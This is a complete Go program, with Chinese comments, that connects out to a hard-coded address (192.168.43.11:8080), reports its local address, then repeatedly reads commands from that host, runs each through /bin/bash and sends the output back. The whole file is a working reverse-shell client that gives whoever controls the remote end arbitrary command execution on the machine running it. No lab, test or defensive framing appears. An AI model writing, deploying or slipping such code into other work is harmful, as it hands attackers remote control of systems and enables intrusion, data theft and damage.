package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
)


func main() {
    // 连接到服务端
    conn, err := net.Dial("tcp", "192.168.43.11:8080")
    if err != nil {
        fmt.Println("Error connecting:", err.Error())
        return
    }
    defer conn.Close()

    // 向服务端发送客户端信息
    clientInfo := "Client connected: " + conn.LocalAddr().String() + "\n"
    _, err = conn.Write([]byte(clientInfo))
    if err != nil {
        fmt.Println("Error sending info:", err.Error())
        return
    }

    // 读取并执行服务端命令
    reader := bufio.NewReader(conn)
    for {
        cmdStr, err := reader.ReadString('\n')
        if err != nil {
            fmt.Println("Error reading command:", err.Error())
            return
        }

        cmd := exec.Command("/bin/bash", "-c", cmdStr)
        output, err := cmd.CombinedOutput()
        if err != nil {
            output = []byte(err.Error())
        }

        _, err = conn.Write(output)
        if err != nil {
            fmt.Println("Error sending output:", err.Error())
            return
        }
    }
}
